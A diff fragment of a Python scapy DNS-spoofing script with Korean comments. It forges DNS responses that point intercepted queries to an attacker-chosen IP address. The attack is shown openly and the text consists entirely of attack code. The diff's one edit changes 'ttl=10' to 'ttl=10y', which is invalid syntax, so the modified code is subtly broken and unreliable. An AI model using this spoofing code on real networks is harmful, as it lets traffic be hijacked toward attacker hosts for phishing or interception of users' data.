@@ -13,7 +13,7 @@ def dnsSpoof(packet):                        #sniff()의 패킷 처리 콜백 �
     if packet.haslayer(DNSQR):            #만약 가로챈 패킷이 DNS쿼리를 가지고 있으면, 이에 대한 DNS응답 패킷을 실제로 생성하는 부분 
         dnsid = packet[DNS].id            #가로챈 패킷에서 id와 qd는 그대로 가져와서  DNS응답 패킷을 구성할 떄 사용. 
         qd = packet[DNS].qd
-        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata = spoofDNS)    #DNS응답 레코드인 DNSRR의 rdata에 변조한 응답 IP주소를 넣는다. 
+        dnsrr = DNSRR(rrname=qd.qname, ttl=10y, rdata = spoofDNS)    #DNS응답 레코드인 DNSRR의 rdata에 변조한 응답 IP주소를 넣는다. 
         spoofPacket = IP(dst = dstip, src = srcip) / UDP(dport = sport, sport = dport) / DNS(id = dnsid, qd=qd, aa=1, qr=1, an=dnsrr)        #실제 DNS응답 패킷을 구성하는 부분 
         send(spoofPacket)
         print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
